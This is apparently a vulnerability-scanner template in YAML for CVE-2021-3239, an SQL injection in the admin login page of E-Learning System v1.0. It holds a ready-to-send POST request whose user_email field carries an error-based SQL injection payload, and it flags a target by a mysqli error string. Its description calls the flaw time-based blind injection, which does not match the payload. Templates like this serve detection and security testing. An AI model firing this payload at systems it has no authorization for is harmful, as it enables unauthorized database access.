expression: r0()
id: CVE-2021-3239
info:
  author: nu11secur1ty
  description: "user_email \u53C2\u6570\u4F3C\u4E4E\u5BB9\u6613\u53D7\u5230\u57FA\u4E8E\
    \u65F6\u95F4\u7684\u76F2\u6CE8\u7684 SQL \u6CE8\u5165\u653B\u51FB\u3002 \u5728\
    \ user_email \u53C2\u6570\u4E2D\u63D0\u4EA4\u4E86\u5355\u5F15\u53F7\uFF0C\u5E76\
    \u8FD4\u56DE\u4E86\u4E00\u822C\u9519\u8BEF\u6D88\u606F\u3002 \u7136\u540E\u63D0\
    \u4EA4\u4E86\u4E24\u4E2A\u5355\u5F15\u53F7\uFF0C\u9519\u8BEF\u4FE1\u606F\u5C31\
    \u6D88\u5931\u4E86\u3002"
  name: "E-Learning System v1.0 SQL\u6CE8\u5165\u57FA\u4E8E\u65F6\u95F4\u76F2\u6CE8\
    \u6F0F\u6D1E"
  reference:
  - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/janobe/CVE-nu11-101821
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'mysqli_query():')
    request:
      body: 'user_email=QXVzAYzI@nu11secur1tycollaborator.net#''||(SELECT 0x57745147
        WHERE 1914=1914 AND (SELECT 7338 FROM(SELECT COUNT(*),CONCAT(0x716a7a7171,(SELECT
        (ELT(7338=7338,1))),0x717a787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS
        GROUP BY x)a))||''&user_pass=u0U!y2z!D9&btnLogin=%C2%9E%C3%A9e

        '
      headers:
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
        Cache-Control: max-age=0
        Connection: close
        Cookie: PHPSESSID=8qen88airh7u0ai06ijhk96a21
        Origin: '{{hosturl}}'
        Referer: '{{hosturl}}/admin/login.php'
      method: POST
      path: /admin/login.php
set:
  hosturl: request.url
